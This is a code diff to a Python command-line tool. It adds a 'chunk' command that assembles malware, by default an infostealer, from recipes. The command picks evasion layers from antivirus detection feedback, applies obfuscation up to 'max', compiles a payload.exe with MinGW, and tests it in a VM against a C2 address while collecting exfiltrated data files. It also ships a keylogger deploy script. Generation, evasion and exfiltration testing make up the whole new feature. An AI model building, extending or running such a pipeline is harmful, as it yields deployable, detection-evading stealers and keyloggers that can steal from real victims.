@@ -19,6 +19,7 @@ import asyncio
 import json
 import logging
 from logging.handlers import RotatingFileHandler
+import os
 import sys
 from pathlib import Path
 
@@ -155,19 +156,25 @@ async def cmd_provision(args) -> int:
             print(f"\nFailed to boot existing VM: {exc}")
             return 1
 
-    engine = ProvisionEngine()
+    daemonize = not getattr(args, "no_daemonize", False)
+    engine = ProvisionEngine(daemonize=daemonize)
     try:
         vm = await engine.provision(config)
         print(f"\nVM ready!")
         print(f"  SSH: ssh {vm.vm_user}@localhost -p {vm.ssh_port}")
         print(f"  Password: {vm.vm_pass}")
-        print("\nVM is running. Press Ctrl-C to stop it.")
-        try:
-            while True:
-                await asyncio.sleep(60)
-        except KeyboardInterrupt:
-            pass
-        await engine.shutdown_all()
+        if daemonize:
+            print(f"\nVM is running in background (PID={vm.qemu.process.pid}).")
+            print("It will stay alive after this process exits.")
+            print("Use --use-existing-vm for pipeline runs.")
+        else:
+            print("\nVM is running. Press Ctrl-C to stop it.")
+            try:
+                while True:
+                    await asyncio.sleep(60)
+            except KeyboardInterrupt:
+                pass
+            await engine.shutdown_all()
         return 0
     except Exception as exc:
         print(f"\nProvisioning failed: {exc}")
@@ -433,6 +440,136 @@ async def cmd_portal(args) -> int:
     return 0
 
 
+async def cmd_chunk(args) -> int:
+    """Assemble malware from chunk recipes (no LLM needed)."""
+    import sys
+    sys.path.insert(0, str(Path(__file__).parent / "templates" / "chunks"))
+    from templates.chunks.assembler import assemble, compile_mingw
+    from templates.chunks.evasion_selector import select_layers, config_to_recipe, format_selection_report, record_run
+
+    recipe_dir = Path(__file__).parent / "templates" / "chunks" / "recipes"
+    output_dir = Path(getattr(args, "output", "results"))
+    output_dir.mkdir(parents=True, exist_ok=True)
+
+    if args.adaptive:
+        detection = getattr(args, "detection", "") or ""
+        config = select_layers(detection_text=detection)
+        print(format_selection_report(config))
+        print()
+
+        malware_type = getattr(args, "type", "infostealer") or "infostealer"
+        recipe_yaml = config_to_recipe(config, malware_type=malware_type)
+
+        recipe_path = output_dir / "adaptive_recipe.yaml"
+        recipe_path.write_text(recipe_yaml)
+        print(f"Adaptive recipe written to {recipe_path}")
+    else:
+        recipe_name = getattr(args, "recipe", "infostealer_full")
+        candidate = Path(recipe_name)
+        if candidate.is_absolute() and candidate.exists():
+            recipe_path = candidate
+        else:
+            recipe_path = recipe_dir / f"{recipe_name}.yaml"
+            if not recipe_path.exists():
+                available = [p.stem for p in recipe_dir.glob("*.yaml")]
+                print(f"Recipe '{recipe_name}' not found. Available: {', '.join(available)}")
+                return 1
+
+    extra_vars = {}
+    for v in getattr(args, "var", []) or []:
+        if "=" in v:
+            k, val = v.split("=", 1)
+            extra_vars[k] = val
+
+    import shutil
+    import time
+
+    malware_type = getattr(args, "type", "infostealer") or "infostealer"
+    timestamp = time.strftime("%Y%m%d_%H%M%S")
+    pkg_dir = output_dir / f"chunk_{malware_type}_{timestamp}"
+    pkg_dir.mkdir(parents=True, exist_ok=True)
+
+    src_out = pkg_dir / "source.c"
+    source = assemble(str(recipe_path), extra_vars)
+
+    obf_level = getattr(args, "obfuscate", None) or "none"
+    if obf_level != "none":
+        from templates.chunks.obfuscate import obfuscate as obf_fn
+        source = obf_fn(source, level=obf_level)
+        print(f"Obfuscated: level={obf_level}")
+
+    src_out.write_text(source)
+    print(f"Assembled: {src_out} ({len(source)} chars)")
+
+    shutil.copy2(str(recipe_path), str(pkg_dir / "recipe.yaml"))
+
+    parse_script = Path(__file__).parent / "scripts" / "parse_exfil.py"
+    if parse_script.exists():
+        shutil.copy2(str(parse_script), str(pkg_dir / "parse_exfil.py"))
+
+    if malware_type == "keylogger":
+        deploy_script = Path(__file__).parent / "scripts" / "deploy_keylogger.sh"
+        if deploy_script.exists():
+            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
+
+    build_info = (
+        f"type: {malware_type}\n"
+        f"recipe: {recipe_path.name}\n"
+        f"obfuscation: {obf_level}\n"
+        f"timestamp: {timestamp}\n"
+        f"source_chars: {len(source)}\n"
+    )
+
+    exe_out = None
+    if args.compile:
+        exe_out = pkg_dir / "payload.exe"
+        ok = compile_mingw(str(src_out), str(exe_out))
+        if not ok:
+            return 1
+        build_info += f"binary_size: {exe_out.stat().st_size}\n"
+
+    rc = 0
+    c2_port = os.environ.get("C2_PORT", extra_vars.get("C2_PORT", "9001"))
+    c2_ip = extra_vars.get("C2_IP", "10.0.2.2")
+
+    if args.test:
+        import subprocess
+        scripts_dir = Path(__file__).parent / "scripts"
+        if malware_type == "keylogger":
+            test_script = scripts_dir / "deploy_keylogger.sh"
+        else:
+            test_script = scripts_dir / "test_template.sh"
+        if not test_script.exists():
+            print(f"{test_script.name} not found — skipping VM test")
+        else:
+            test_input = str(exe_out) if exe_out and exe_out.exists() else str(src_out)
+            test_env = os.environ.copy()
+            test_env["C2_RESULTS_DIR"] = str(pkg_dir)
+            if malware_type == "keylogger":
+                cmd = ["bash", str(test_script), test_input, c2_port]
+            else:
+                cmd = ["bash", str(test_script)]
+                if args.snapshot:
+                    cmd.append("--snapshot")
+                cmd.extend([test_input, c2_ip, c2_port])
+            rc = subprocess.run(cmd, env=test_env).returncode
+            build_info += f"vm_test: {'PASS' if rc == 0 else 'FAIL'}\n"
+
+            for f in pkg_dir.glob("exfil_*.bin"):
+                build_info += f"exfil: {f.name} ({f.stat().st_size} bytes)\n"
+
+    (pkg_dir / "build_info.txt").write_text(build_info)
+
+    # Symlink results/latest -> this package for convenience
+    latest = output_dir / "latest"
+    if latest.is_symlink() or latest.exists():
+        latest.unlink()
+    latest.symlink_to(pkg_dir.name)
+
+    print(f"Package: {pkg_dir}/")
+    return rc
+
+
 async def cmd_analyze(args) -> int:
     """Run DB queries and show the context without generating code."""
     debug = DebugLogger(enabled=getattr(args, "debug", False))
@@ -547,6 +684,10 @@ def build_parser() -> argparse.ArgumentParser:
     prov_parser.add_argument(
         "--boot-existing", action="store_true",
         help="Boot an already-installed VM disk without re-running the installer",
+    )
+    prov_parser.add_argument(
+        "--no-daemonize", action="store_true", dest="no_daemonize",
+        help="Don't daemonize — block until Ctrl-C then kill VM (old behavior)",
     )
 
     # -- verify -------------------------------------------------------------
@@ -681,6 +822,23 @@ def build_parser() -> argparse.ArgumentParser:
     portal_parser.add_argument("--port", type=int, default=7070, help="Port to listen on (default: 7070)")
     portal_parser.add_argument("--host", default="127.0.0.1", help="Host to bind to (default: 127.0.0.1)")
 
+    # -- chunk --------------------------------------------------------------
+    chunk_parser = subparsers.add_parser(
+        "chunk",
+        help="Assemble malware from chunk recipes (no LLM needed)",
+    )
+    chunk_parser.add_argument("--recipe", default="infostealer_full", help="Recipe name (default: infostealer_full)")
+    chunk_parser.add_argument("--adaptive", action="store_true", help="Use evasion_selector to pick layers adaptively")
+    chunk_parser.add_argument("--type", default="infostealer", help="Malware type for adaptive mode (default: infostealer)")
+    chunk_parser.add_argument("--detection", default="", help="Detection feedback for adaptive mode (e.g. 'Trojan:Win32/Stealer')")
+    chunk_parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
+    chunk_parser.add_argument("--test", action="store_true", help="Deploy and test on VM (implies --compile)")
+    chunk_parser.add_argument("--snapshot", action="store_true", help="Use VM snapshot before testing")
+    chunk_parser.add_argument("-o", "--output", default="results", help="Output directory (default: results)")
+    chunk_parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")
+    chunk_parser.add_argument("--obfuscate", choices=["none", "light", "heavy", "max"],
+                              default="none", help="Source-level obfuscation (default: none)")
+
     # -- analyze ------------------------------------------------------------
     ana_parser = subparsers.add_parser("analyze", help="Query DBs and show context without generating code")
     ana_parser.add_argument("--spec", required=True, help="Path to target spec")
@@ -776,6 +934,7 @@ def main():
         "provision": cmd_provision,
         "verify":    cmd_verify,
         "run":       cmd_run,
+        "chunk":     cmd_chunk,
         "clean":     cmd_clean,
         "analyze":   cmd_analyze,
         "portal":    cmd_portal,
